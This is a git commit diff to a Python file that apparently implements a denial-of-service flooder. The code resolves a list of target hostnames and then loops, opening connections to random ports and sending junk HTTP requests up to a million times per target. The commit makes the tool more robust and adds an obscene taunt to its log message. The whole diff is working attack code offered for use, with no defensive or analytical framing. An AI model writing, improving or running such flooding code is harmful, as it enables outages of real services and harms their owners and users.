24c242d36f163dbd53fdd151deb9f74740773e76
andrew <surugov2012@gmail.com>
2022-02-26 20:30:04 +0200

    fix

--- app/src/core.py
+++ app/src/core.py
@@ -4,9 +4,17 @@ import logging
 
 
 def get_ips(love:str) -> list:
+    list_of_valid_ips = list()
     with open(love, "r") as love:
-        urls = love.read().split("\n")  
-    return list(map(lambda x: {"url": x , "ip": socket.gethostbyname(x)}, urls))
+        urls = love.read().split("\n")
+    for url in urls:
+        try:
+            list_of_valid_ips.append(
+                {"url": url , "ip": socket.gethostbyname(url)}
+            )
+        except:
+            pass
+    return list_of_valid_ips
 
 def send_requests(trgets:list) -> None:
     while True:
@@ -17,18 +25,18 @@ def send_requests(trgets:list) -> None:
             try:
                 port = random.choice(ports)
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((trget[1], port))
+                s.connect((trget['ip'], port))
                 s.sendto(
                     ("GET /" + trget["ip"] + " HTTP/1.1\r\n").encode("ascii"), 
                     (trget["ip"], port)
                 )
                 s.close()
-                logging.info(f'{trget["url"]}: {trget["ip"]}:{port}')
+                logging.info(f'IDI NAHUI {trget["url"]}: {trget["ip"]}:{port}')
                 changer += 1
                 if changer == 1_000_000:
                     break
-            except:
-                logging.info(f'{trget["url"]}: {trget["ip"]}:{port} blocked')
+            except Exception as ex:
+                logging.info(f'{trget["url"]}: {trget["ip"]}:{port} {ex}')
                 ports.remove(port)
                 if not ports:
                     break
